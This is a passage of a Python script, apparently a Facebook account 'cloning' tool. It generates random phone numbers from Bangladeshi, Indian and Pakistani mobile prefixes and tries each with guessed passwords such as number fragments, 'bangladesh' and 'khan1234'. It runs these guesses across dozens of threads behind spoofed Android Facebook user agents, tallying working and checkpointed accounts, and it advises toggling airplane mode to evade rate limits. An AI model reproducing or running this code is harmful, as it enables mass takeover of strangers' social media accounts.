1938','PADM00','CPH1837','PADT00','CPH1803','CPH1853','CPH1805','CPH1931','CPH1959','CPH1933','CPH1935','CPH1943','CPH1909','CPH1901','PDBM00','CPH1941','CPH2179','CPH2083','CPH2185','CPH2185','CPH2477','CPH2591','CHP2219','CPH1923','CPH2213','CPH1869','CPH1929','CPH2107','CPH2238','CPH2389','CPH2401','CPH2407','CPH2413','CPH2415','CPH2417','CPH2419','CPH2455','CPH2459','CPH2461','CPH2471','CPH2473','CPH2477','CPH8893','CPH2321','CPH2341','CPH2373','CPH2083','CPH2071','CPH2077','CPH2185','CPH2179','CPH2269','CPH2421','CPH2349','CPH2271','CPH1923','CPH1925','CPH1837','CPH2015','CPH2073','CPH2081','CPH2029','CPH2031','CPH2137','CPH1605','CPH1803','CPH1853','CPH1805','CPH1809','CPH1851','CPH1931','CPH1959','CPH1933','CPH1935','CPH1943','CPH2061','CPH2069','CPH2127','CPH2131','CPH2139','CPH2135','CPH2239','CPH2195','CPH2273','CPH2325','CPH2309','CPH1701','CPH2387','CPH1909','CPH1920','CPH1912','CPH1901','CPH1903','CPH1905','CPH1717','CPH1801','CPH2067','CPH2099','CPH2161','CPH2219','CPH2197','CPH2263','CPH2375','CPH2339','CPH1715','CPH2385','CPH1729','CPH1827','CPH1938','CPH1937','CPH1939','CPH1941','CPH2001','CPH2021','CPH2059','CPH2121','CPH2123','CPH2203','CPH2333','CPH2365','CPH1913','CPH1911','CPH1915','CPH1969','CPH2209','CPH1987','CPH2095','CPH2119','CPH2285','CPH2213','CPH2223','CPH2363','CPH1609','CPH1613','CPH1723','CPH1727','CPH1725','CPH1819','CPH1821','CPH1825','CPH1881','CPH1823','CPH1871','CPH1875','CPH2023','CPH2005','CPH2025','CPH2207','CPH2173','CPH2307','CPH2305','CPH2337','CPH1955','CPH1707','CPH1719','CPH1721','CPH1835','CPH1831','CPH1833','CPH1879','CPH1893','CPH1877','CPH1607','CPH1611','CPH1917','CPH1919','CPH1907','CPH1989','CPH1945','CPH1951','CPH2043','CPH2035','CPH2037','CPH2036','CPH2009','CPH2013','CPH2113','CPH2091','CPH2125','CPH2109','CPH2089','CPH2065','CPH2159','CPH2145','CPH2205','CPH2201','CPH2199','CPH2217','CPH1921','CPH2211','CPH2235','CPH2251','CPH2249','CPH2247','CPH2237','CPH2371','CPH2293','CPH2353','CPH2343','CPH2359','CPH2357','CPH2457','CPH1983','CPH1979'])
    fban = random.choice(['FB4A'])
    facebook_version = f'''{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}'''
    fb_ver_code = str(random.randint(10000000, 66666666))
    density = random.choice(['1.0','1.7','2.0','2.25','2.5','3.0','3.5'])
    width = random.randint(720, 1440)
    height = random.randint(1080, 2560)
    fblc = random.choice(['en_US','en_GB'])
    sim_name = random.choice(['Banglalink','Robi','MTN-CG','Grameenphone','Artel','Teletalk'])
    fbpn = random.choice(['com.facebook.katana'])
    fbmf = 'Realme'
    fbbd = 'Realme'
    mobile_model = f'''{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}'''
    modelx = random.choice(["RMX3890","RMX1911","RMX2193","RMX1931","RMX2170","RMX3201","RMX2180","RMX2021","RMX2020","RMX1921","RMX2156","RMX3363","RMX3081","RMX2001","RMX3263","RMX2155","RMX3195","RMX1993"])
    last = f'''[FBAN/{fban};FBAV/{facebook_version};FBBV/{fb_ver_code};FBDM/{{density={density},width={width},height={height}}};FBLC/{fblc};FBCR/{sim_name};FBMF/{fbmf};FBBD/{fbbd};FBPN/{fbpn};FBDV/{modelx};FBSV/{mobile_model};FBOP/1;FBCA/armeabi-v7a:armeabi;]'''
    last = f'''[FBAN/{fban};FBAV/{facebook_version};FBBV/{fb_ver_code};FBDM/{{density={density},width={width},height={height}}};FBLC/{fblc};FBCR/{sim_name};FBMF/{fbmf};FBBD/{fbbd};FBPN/{fbpn};FBDV/{modelx};FBSV/{mobile_model};FBOP/1;FBCA/arm64-v8a:;]'''
    ua = f'''Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {mix} Build/QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) ''' + last
    return ua
#▬▭▬▭▬▭▬▭[ FILE_M4_UA]▬▭▬▭▬▭▬▭#

#▬▭▬▭▬▭▬▭[ FILE_M5_UA]▬▭▬▭▬▭▬▭#

#▬▭▬▭▬▭▬▭[ FILE_M6_UA]▬▭▬▭▬▭▬▭#

#▬▭▬▭▬▭▬▭[RANDOM_M1_UA]▬▭▬▭▬▭▬▭#

#▬▭▬▭▬▭▬▭[RANDOM_M2_UA]▬▭▬▭▬▭▬▭#

#▬▭▬▭▬▭▬▭[RANDOM_M3_UA]▬▭▬▭▬▭▬▭#

#▬▭▬▭▬▭▬▭[TOOL VERSION]▬▭▬▭▬▭▬▭#
ver ='\033[92;1m1\033[93;1m'
#▬▭▬▭▬▭▬▭[ MY_LOGO]▬▭▬▭▬▭▬▭#
logo=(f"""
  \x1b[38;5;46m▞▀▖▞▀▖▛▀▖▞▀▖▛▀▘▌ ▌▌   ▞▀▖▌ ▌▙▗▌▛▀▘▛▀▖
  \x1b[38;5;46m▙▄▌▚▄ ▙▄▘▙▄▌▙▄ ▌ ▌▌   ▙▄▌▙▄▌▌▘▌▙▄ ▌ ▌
  \x1b[38;5;46m▌ ▌▖ ▌▌▚ ▌ ▌▌  ▌ ▌▌   ▌ ▌▌ ▌▌ ▌▌  ▌ ▌
  \x1b[38;5;46m▘ ▘▝▀ ▘ ▘▘ ▘▘  ▝▀ ▀▀▘ ▘ ▘▘ ▘▘ ▘▀▀▘▀▀ \033[38;5;50m=[PREMIUM]=""")
info=(f"""{style}{green} DEVELOPER {red}» {white}MR-ASRAFUL
{style}{green} STATUS    {red}» {faltu}{rad}FILE{pvt}{green}{green1}┼{faltu}{rad}RANDOM{pvt}{green}
{style} {green}VERSION   {red}» {white}{ver}
{style}{green} GITHUB    {red}» {white}github.com/MR-ASRAFUL-404""")
def main_logo():
    if "win" in sys.platform:os.system("cls")
    else:os.system("clear")
    print(logo);linex();print(info);linex()
#▬▭▬▭▬▭▬▭[MAIN MENU]▬▭▬▭▬▭▬▭#
def ASRAFUL_main():
    main_logo()
    #animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    #for i in range(30):
        #time.sleep(0.1)
        #sys.stdout.write(f"\r{style} {green}LOADING...\033[97;1m " + animation[i % len(animation)] +"\x1b[0m ")
        #sys.stdout.flush()
    main_logo()
    print(f'{white}[{red}A{white}] {green}START {rad}[{white}FILE{rad}] {green}CLONE')
    print(f'{white}[{red}B{white}] {green}START {rad}[{white}RANDOM{rad}] {green}CLONE')
    print(f'{white}[{red}B{white}] {green}CONTACT TOOL ADMIN')
    print(f'{white}[{red}O{white}] {green}EXIT THIS TERMINAL');linex()
    menu_select = input(f'{white}[{red}?{white}] {green}SELECT {white}▶︎ {green}')
    if menu_select in ['A','a','01','1']:os.system("xdg-open ");__FILEX__()
    elif menu_select in ['B','b','02','2']:os.system("xdg-open ");_random_password()
    elif menu_select in ['C','c','03','3']:os.system("xdg-open ")
    elif menu_select in ['O','o','00','0']:os.system("xdg-open ");os.system("exit")
    else:print(f'SELECTED OPTION NOT FOUND');ASRAFUL_main()
#▬▭▬▭▬▭▬▭[RANDOM PASSWORD]▬▭▬▭▬▭▬▭#
def _random_password():
    main_logo()
    print(f'{white}[{red}A{white}]{green} AUTO PASSWORD')
    print(f'{white}[{red}B{white}]{green} CUSTOM PASSWORD')
    linex()
    random_pass = input(f'{white}[{red}?{white}] {green}SELECT {white}▶︎ {green}')
    if random_pass in ['A','a','01','1']:_random_()
    elif random_pass in ['B','b','02','2']:_random_choice()
    else:_random_()
#▬▭▬▭▬▭▬▭[RANDOM MENU AUTO]▬▭▬▭▬▭▬▭#
def _random_():
    main_logo()
    print(f'{white}[{red}A{white}]{green} BD RANDOM V1 ')
    print(f'{white}[{red}B{white}]{green} BD RANDOM V2')
    print(f'{white}[{red}C{white}]{green} INDIA RANDOM')
    print(f'{white}[{red}D{white}]{green} PAKISTAN RANDOM')
    print(f'{white}[{red}E{white}]{green} NEPAL RANDOM')
    linex()
    random_select = input(f'{white}[{red}?{white}] {green}SELECT {white}▶︎ {green}')
    if random_select in ['A','a','01','1']:_bangladesh_()
    elif random_select in ['B','b','02','2']:_bangladesh2_()
    elif random_select in ['C','c','03','3']:_india_()
    elif random_select in ['D','d','04','4']:_pakistan_()
    elif random_select in ['E','e','05','5']:_nepal_()
    else:_random_()
#▬▭▬▭▬▭▬▭[RANDOM MENU CHOICE]▬▭▬▭▬▭▬▭#
def _random_choice():
    main_logo()
    print(f'{white}[{red}A{white}]{green} BD RANDOM V1 ')
    print(f'{white}[{red}B{white}]{green} BD RANDOM V2')
    print(f'{white}[{red}C{white}]{green} INDIA RANDOM')
    print(f'{white}[{red}D{white}]{green} PAKISTAN RANDOM')
    print(f'{white}[{red}E{white}]{green} NEPAL RANDOM')
    linex()
    random_select = input(f'{white}[{red}?{white}] {green}SELECT {white}▶︎ {green}')
    if random_select in ['A','a','01','1']:_bangladesh_choice()
    elif random_select in ['B','b','02','2']:_bangladesh2_choice()
    elif random_select in ['C','c','03','3']:_india_choice()
    elif random_select in ['D','d','04','4']:_pakistan_choice()
    elif random_select in ['E','e','05','5']:_nepal_choice()
    else:_random_choice()
#▬▭▬▭▬▭▬▭[BD RANDOM 1]▬▭▬▭▬▭▬▭#
def _bangladesh_():
    main_logo()
    print(f'{style}{green} SIM CODE {white}: {green} 017 019 018 016 013');linex()
    code = input(f"{style}{green} SELECT CODE {white}▶︎ {green}")
    main_logo()
    print(f'{style}{green} EXAMPLE {white}: {green} 1000 2000 3000 6000 9999 99999');linex()
    limit = int(input(f"{style} {green}ENTER LIMITS {white}▶︎ {green}"))
    plist = []
    main_logo()
    print(f'{white}[{red}A{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}B{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}C{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
 #   print(f'{white}[{red}D{white}]{green} METHOD{Y} - {red}[{white}GP{green}-{white}BL{green}-{white}WIFI]')
    #print(f'{white}[{red}E{white}]{green} METHOD{Y} - {red}[{white}ALL SIM{green}-{white}WIFI]')
    linex()
    random_method= input(f"{white}[{red}?{white}]{green} SELECT {white}▶︎ ")
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    main_logo();tl = str(len(user))
    with ThreadPoolExecutor(max_workers=30) as mr_ASRAFUL_404:
        main_logo()
        print(f'{style}{green} SIM NAME  {cyan}»{white} {sim}')
        print(f'{style}{green} TOTAL IDS{cyan} »{white} {tl}'+f'{red} ┼{green} SIM CODE{cyan} »{white} {code}')
        print(f'{style}{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY 5{green} MIN');linex()
        for love in user:
            ids = code + love
            passlist = [ids,love,ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:],'১২৩৪৫৬','bangladesh','506070','mimmim','free fire','i love you','Bangladesh','@@@###','jannat','bangla','@@@@@@']
            if random_method in ['A','a','01','1']:mr_ASRAFUL_404.submit(_method_one, ids, passlist,tl)
            elif random_method in ['B','b','02','2']:mr_ASRAFUL_404.submit(_method_two, ids, passlist,tl)
            elif random_method in ['C','c','03','3']:mr_ASRAFUL_404.submit(_method_three, ids, passlist,tl)
            elif random_method in ['D','d','04','4']:mr_ASRAFUL_404.submit(_method_four, ids, passlist,tl)
            elif random_method in ['E','e','05','5']:mr_ASRAFUL_404.submit(_method_five, ids, passlist,tl)
            else:print(f'SELECTED OPTION NOT FOUND')
    print("");linex();print(f"{style}{green} THE PROCESS HAS BEEN COMPLETED");print(f"{style} {green}TOTAL OK {white}▶︎ {green}{len(oks)}"+f'{red} ┼{green} TOTAL CP {white}▶︎ {green}{len(cps)}');linex();exit()
def _bangladesh_choice():
    main_logo()
    print(f'{style}{green} SIM CODE {white}: {green} 017 019 018 016 013');linex()
    code = input(f"{style}{green} SELECT CODE {white}▶︎ {green}")
    main_logo()
    print(f'{style}{green} EXAMPLE {white}: {green} 1000 2000 3000 6000 9999 99999');linex()
    limit = int(input(f"{style} {green}ENTER LIMITS {white}▶︎ {green}"))
    plist = []
    main_logo()
    print(f'{white}[{red}A{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}B{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}C{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
 #   print(f'{white}[{red}D{white}]{green} METHOD{Y} - {red}[{white}GP{green}-{white}BL{green}-{white}WIFI]')
    #print(f'{white}[{red}E{white}]{green} METHOD{Y} - {red}[{white}ALL SIM{green}-{white}WIFI]')
    linex()
    random_method= input(f"{white}[{red}?{white}]{green} SELECT {white}▶︎ ")
    main_logo()
    psl = int(input(f'{style} {green}PASS LIMITS {white}▶︎ {green}'));linex()
    main_logo()
    for i in range(psl):
        plist.append(input(f'{style}{green} PASSWORD NO.{i+1} {white}▶︎ {green}'));linex()
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    main_logo();tl = str(len(user))
    with ThreadPoolExecutor(max_workers=30) as mr_ASRAFUL_404:
        main_logo()
        print(f'{style}{green} SIM NAME  {cyan}»{white} {sim}')
        print(f'{style}{green} TOTAL IDS{cyan} »{white} {tl}'+f'{red} ┼{green} SIM CODE{cyan} »{white} {code}')
        print(f'{style}{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY 5{green} MIN');linex()
        for love in user:
            ids = code + love
            passlist = [ids,love,ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:],'১২৩৪৫৬','bangladesh','506070','mimmim','sabbir','i love you','Bangladesh','@@@###','jannat','bangla','@@@@@@']
            if random_method in ['A','a','01','1']:mr_ASRAFUL_404.submit(_method_one, ids, passlist,tl)
            elif random_method in ['B','b','02','2']:mr_ASRAFUL_404.submit(_method_two, ids, passlist,tl)
            elif random_method in ['C','c','03','3']:mr_ASRAFUL_404.submit(_method_three, ids, passlist,tl)
            elif random_method in ['D','d','04','4']:mr_ASRAFUL_404.submit(_method_four, ids, passlist,tl)
            elif random_method in ['E','e','05','5']:mr_ASRAFUL_404.submit(_method_five, ids, passlist,tl)
            else:print(f'SELECTED OPTION NOT FOUND')
    print("");linex();print(f"{style}{green} THE PROCESS HAS BEEN COMPLETED");print(f"{style} {green}TOTAL OK {white}▶︎ {green}{len(oks)}"+f'{red} ┼{green} TOTAL CP {white}▶︎ {green}{len(cps)}');linex();exit()
#▬▭▬▭▬▭▬▭[BD RANDOM 2]▬▭▬▭▬▭▬▭#
def _bangladesh2_():
    main_logo()
    print(f'{style}{green} SIM CODE {white}: {green}01711 01125 01872 01993 01628');linex()
    code = input(f"{style}{green} SELECT CODE {white}▶︎ {green}")
    main_logo()
    print(f'{style}{green} EXAMPLE {white}: {green} 1000 2000 3000 6000 9999 99999');linex()
    limit = int(input(f"{style} {green}ENTER LIMITS {white}▶︎ {green}"))
    main_logo()
    print(f'{white}[{red}A{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}B{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}C{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
 #   print(f'{white}[{red}D{white}]{green} METHOD{Y} - {red}[{white}GP{green}-{white}BL{green}-{white}WIFI]')
    #print(f'{white}[{red}E{white}]{green} METHOD{Y} - {red}[{white}ALL SIM{green}-{white}WIFI]')
    linex()
    random_method= input(f"{white}[{red}?{white}]{green} SELECT {white}▶︎ ")
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    main_logo();tl = str(len(user))
    with ThreadPoolExecutor(max_workers=80) as mr_ASRAFUL_404:
        main_logo()
        print(f'{style}{green} SIM NAME  {cyan}»{white} {sim}')
        print(f'{style}{green} TOTAL IDS{cyan} »{white} {tl}'+f'{red} ┼{green} SIM CODE{cyan} »{white} {code}')
        print(f'{style}{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY 5{green} MIN');linex()
        for love in user:
            ids = code + love
            passlist = [ids,love,ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:],'১২৩৪৫৬','bangladesh','506070','mimmim','sabbir','i love you','Bangladesh','@@@###','jannat','bangla','@@@@@@']
            if random_method in ['A','a','01','1']:mr_ASRAFUL_404.submit(_method_one, ids, passlist,tl)
            elif random_method in ['B','b','02','2']:mr_ASRAFUL_404.submit(_method_two, ids, passlist,tl)
            elif random_method in ['C','c','03','3']:mr_ASRAFUL_404.submit(_method_four, ids, passlist,tl)
            elif random_method in ['D','d','04','4']:mr_ASRAFUL_404.submit(_method_four, ids, passlist,tl)
            elif random_method in ['E','e','05','5']:mr_ASRAFUL_404.submit(_method_five, ids, passlist,tl)
            else:print(f'SELECTED OPTION NOT FOUND')
    print("");linex();print(f"{style}{green} THE PROCESS HAS BEEN COMPLETED");print(f"{style} {green}TOTAL OK {white}▶︎ {green}{len(oks)}"+f'{red} ┼{green} TOTAL CP {white}▶︎ {green}{len(cps)}');linex();exit()
def _bangladesh2_choice():
    main_logo()
    print(f'{style}{green} SIM CODE {white}: {green}01711 01125 01872 01993 01628');linex()
    code = input(f"{style}{green} SELECT CODE {white}▶︎ {green}")
    main_logo()
    print(f'{style}{green} EXAMPLE {white}: {green} 1000 2000 3000 6000 9999 99999');linex()
    limit = int(input(f"{style} {green}ENTER LIMITS {white}▶︎ {green}"))
    main_logo()
    print(f'{white}[{red}A{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}B{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}C{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
 #   print(f'{white}[{red}D{white}]{green} METHOD{Y} - {red}[{white}GP{green}-{white}BL{green}-{white}WIFI]')
    #print(f'{white}[{red}E{white}]{green} METHOD{Y} - {red}[{white}ALL SIM{green}-{white}WIFI]')
    linex()
    random_method= input(f"{white}[{red}?{white}]{green} SELECT {white}▶︎ ")
    plist = []
    main_logo()
    psl = int(input(f'{style} {green}PASS LIMITS {white}▶︎ {green}'));linex()
    main_logo()
    for i in range(psl):
        plist.append(input(f'{style}{green} PASSWORD NO.{i+1} {white}▶︎ {green}'));linex()
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    main_logo();tl = str(len(user))
    with ThreadPoolExecutor(max_workers=30) as mr_ASRAFUL_404:
        main_logo()
        print(f'{style}{green} SIM NAME  {cyan}»{white} {sim}')
        print(f'{style}{green} TOTAL IDS{cyan} »{white} {tl}'+f'{red} ┼{green} SIM CODE{cyan} »{white} {code}')
        print(f'{style}{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY 5{green} MIN');linex()
        for love in user:
            ids = code + love
            passlist = plist
            if random_method in ['A','a','01','1']:mr_ASRAFUL_404.submit(_method_one, ids, passlist,tl)
            elif random_method in ['B','b','02','2']:mr_ASRAFUL_404.submit(_method_two, ids, passlist,tl)
            elif random_method in ['C','c','03','3']:mr_ASRAFUL_404.submit(_method_four, ids, passlist,tl)
            elif random_method in ['D','d','','']:mr_ASRAFUL_404.submit(_method_four, ids, passlist,tl)
            elif random_method in ['E','e','05','5']:mr_ASRAFUL_404.submit(_method_five, ids, passlist,tl)
            else:print(f'SELECTED OPTION NOT FOUND')
    print("");linex();print(f"{style}{green} THE PROCESS HAS BEEN COMPLETED");print(f"{style} {green}TOTAL OK {white}▶︎ {green}{len(oks)}"+f'{red} ┼{green} TOTAL CP {white}▶︎ {green}{len(cps)}');linex();exit()
#▬▭▬▭▬▭▬▭[IND RANDOM]▬▭▬▭▬▭▬▭#
def _india_():
    main_logo()
    print(f'{style}{green} SIM CODE {white}: {green}+91902 +91639 +91934 +91701');linex()
    code = input(f"{style}{green} SELECT CODE {white}▶︎ {green}")
    main_logo()
    print(f'{style}{green} EXAMPLE {white}: {green} 1000 2000 3000 6000 9999 99999');linex()
    limit = int(input(f"{style} {green}ENTER LIMITS {white}▶︎ {green}"))
    main_logo()
    print(f'{white}[{red}A{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}B{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}C{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
 #   print(f'{white}[{red}D{white}]{green} METHOD{Y} - {red}[{white}GP{green}-{white}BL{green}-{white}WIFI]')
    #print(f'{white}[{red}E{white}]{green} METHOD{Y} - {red}[{white}ALL SIM{green}-{white}WIFI]')
    linex()
    random_method= input(f"{white}[{red}?{white}]{green} SELECT {white}▶︎ ")
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    main_logo();tl = str(len(user))
    with ThreadPoolExecutor(max_workers=30) as mr_ASRAFUL_404:
        main_logo()
        print(f'{style}{green} SIM NAME  {cyan}»{white} {sim}')
        print(f'{style}{green} TOTAL IDS{cyan} »{white} {tl}'+f'{red} ┼{green} SIM CODE{cyan} »{white} {code}')
        print(f'{style}{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY 5{green} MIN');linex()
        for love in user:
            ids = code + love
            passlist = [love,ids, '57575751', '57273200', '59039200']
            if random_method in ['A','a','01','1']:mr_ASRAFUL_404.submit(_method_one, ids, passlist,tl)
            elif random_method in ['B','b','02','2']:mr_ASRAFUL_404.submit(_method_two, ids, passlist,tl)
            elif random_method in ['C','c','03','3']:mr_ASRAFUL_404.submit(_method_four, ids, passlist,tl)
            elif random_method in ['D','d','04','4']:mr_ASRAFUL_404.submit(_method_four, ids, passlist,tl)
            elif random_method in ['E','e','05','5']:mr_ASRAFUL_404.submit(_method_five, ids, passlist,tl)
            else:print(f'SELECTED OPTION NOT FOUND')
    print("");linex();print(f"{style}{green} THE PROCESS HAS BEEN COMPLETED");print(f"{style} {green}TOTAL OK {white}▶︎ {green}{len(oks)}"+f'{red} ┼{green} TOTAL CP {white}▶︎ {green}{len(cps)}');linex();exit()
def _india_choice():
    main_logo()
    print(f'{style}{green} SIM CODE {white}: {green}+91902 +91639 +91934 +91701');linex()
    code = input(f"{style}{green} SELECT CODE {white}▶︎ {green}")
    main_logo()
    print(f'{style}{green} EXAMPLE {white}: {green} 1000 2000 3000 6000 9999 99999');linex()
    limit = int(input(f"{style} {green}ENTER LIMITS {white}▶︎ {green}"))
    main_logo()
    print(f'{white}[{red}A{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}B{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}C{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
 #   print(f'{white}[{red}D{white}]{green} METHOD{Y} - {red}[{white}GP{green}-{white}BL{green}-{white}WIFI]')
    #print(f'{white}[{red}E{white}]{green} METHOD{Y} - {red}[{white}ALL SIM{green}-{white}WIFI]')
    linex()
    random_method= input(f"{white}[{red}?{white}]{green} SELECT {white}▶︎ ")
    main_logo()
    psl = int(input(f'{style} {green}PASS LIMITS {white}▶︎ {green}'));linex()
    main_logo()
    for i in range(psl):
        plist.append(input(f'{style}{green} PASSWORD NO.{i+1} {white}▶︎ {green}'));linex()
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    main_logo();tl = str(len(user))
    with ThreadPoolExecutor(max_workers=30) as mr_ASRAFUL_404:
        main_logo()
        print(f'{style}{green} SIM NAME  {cyan}»{white} {sim}')
        print(f'{style}{green} TOTAL IDS{cyan} »{white} {tl}'+f'{red} ┼{green} SIM CODE{cyan} »{white} {code}')
        print(f'{style}{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY 5{green} MIN');linex()
        for love in user:
            ids = code + love
            passlist = plist
            if random_method in ['A','a','01','1']:mr_ASRAFUL_404.submit(_method_one, ids, passlist,tl)
            elif random_method in ['B','b','02','2']:mr_ASRAFUL_404.submit(_method_two, ids, passlist,tl)
            elif random_method in ['C','c','03','3']:mr_ASRAFUL_404.submit(_method_four, ids, passlist,tl)
            elif random_method in ['D','d','04','4']:mr_ASRAFUL_404.submit(_method_four, ids, passlist,tl)
            elif random_method in ['E','e','05','5']:mr_ASRAFUL_404.submit(_method_five, ids, passlist,tl)
            else:print(f'SELECTED OPTION NOT FOUND')
    print("");linex();print(f"{style}{green} THE PROCESS HAS BEEN COMPLETED");print(f"{style} {green}TOTAL OK {white}▶︎ {green}{len(oks)}"+f'{red} ┼{green} TOTAL CP {white}▶︎ {green}{len(cps)}');linex();exit()
#▬▭▬▭▬▭▬▭[PAK RANDOM]▬▭▬▭▬▭▬▭#
def _pakistan_():
    main_logo()
    print(f'{style}{green} SIM CODE {white}: {green}0315 0345 0333');linex()
    code = input(f"{style}{green} SELECT CODE {white}▶︎ {green}")
    main_logo()
    print(f'{style}{green} EXAMPLE {white}: {green} 1000 2000 3000 6000 9999 99999');linex()
    limit = int(input(f"{style} {green}ENTER LIMITS {white}▶︎ {green}"))
    main_logo()
    print(f'{white}[{red}A{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}B{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}C{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
 #   print(f'{white}[{red}D{white}]{green} METHOD{Y} - {red}[{white}GP{green}-{white}BL{green}-{white}WIFI]')
    #print(f'{white}[{red}E{white}]{green} METHOD{Y} - {red}[{white}ALL SIM{green}-{white}WIFI]')
    linex()
    random_method= input(f"{white}[{red}?{white}]{green} SELECT {white}▶︎ ")
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    main_logo();tl = str(len(user))
    with ThreadPoolExecutor(max_workers=30) as mr_ASRAFUL_404:
        main_logo()
        print(f'{style}{green} SIM NAME  {cyan}»{white} {sim}')
        print(f'{style}{green} TOTAL IDS{cyan} »{white} {tl}'+f'{red} ┼{green} SIM CODE{cyan} »{white} {code}')
        print(f'{style}{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY 5{green} MIN');linex()
        for love in user:
            ids = code + love
            au = love[:6];bu = ids[:8];passlist = [love,ids,au,bu, 'khankhan', 'khan khan', 'khan1234', 'khan12345', 'Pakistan', '203040']
            if random_method in ['A','a','01','1']:mr_ASRAFUL_404.submit(_method_one, ids, passlist,tl)
            elif random_method in ['B','b','02','2']:mr_ASRAFUL_404.submit(_method_two, ids, passlist,tl)
            elif random_method in ['C','c','03','3']:mr_ASRAFUL_404.submit(_method_four, ids, passlist,tl)
            elif random_method in ['D','d','04','4']:mr_ASRAFUL_404.submit(_method_four, ids, passlist,tl)
            elif random_method in ['E','e','05','5']:mr_ASRAFUL_404.submit(_method_five, ids, passlist,tl)
            else:print(f'SELECTED OPTION NOT FOUND')
    print("");linex();print(f"{style}{green} THE PROCESS HAS BEEN COMPLETED");print(f"{style} {green}TOTAL OK {white}▶︎ {green}{len(oks)}"+f'{red} ┼{green} TOTAL CP {white}▶︎ {green}{len(cps)}');linex();exit()
def _pakistan_choice():
    main_logo()
    print(f'{style}{green} SIM CODE {white}: {green}0315 0345 0333');linex()
    code = input(f"{style}{green} SELECT CODE {white}▶︎ {green}")
    main_logo()
    print(f'{style}{green} EXAMPLE {white}: {green} 1000 2000 3000 6000 9999 99999');linex()
    limit = int(input(f"{style} {green}ENTER LIMITS {white}▶︎ {green}"))
    main_logo()
    print(f'{white}[{red}A{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}B{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
    print(f'{white}[{red}C{white}]{green} METHOD{Y} - {red}[{white}ONLY DATA{red}]')
 #   print(f'{white}[{red}D{white}]{green} METHOD{Y} - {red}[{white}GP{green}-{white}BL{green}-{white}WIFI]')
    #print(f'{white}[{red}E{white}]{green} METHOD{Y} - {red}[{white}ALL SIM{green}-{white}WIFI]')
    linex()
    random_method= input(f"{white}[{red}?{white}]{green} SELECT {white}▶︎ ")
    main_logo()
    psl = int(input(f'{style} {green}PASS LIMITS {white}▶︎ {green}'));linex()
    main_logo()
    for i in range(psl):
        plist.append(input(f'{style}{green} PASSWORD NO.{i+1} {white}▶︎ {green}'));linex()
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    main_logo();tl = str(len(user))
    with ThreadPoolExecutor(max_workers=30) as mr_ASRAFUL_404:
        main_logo()
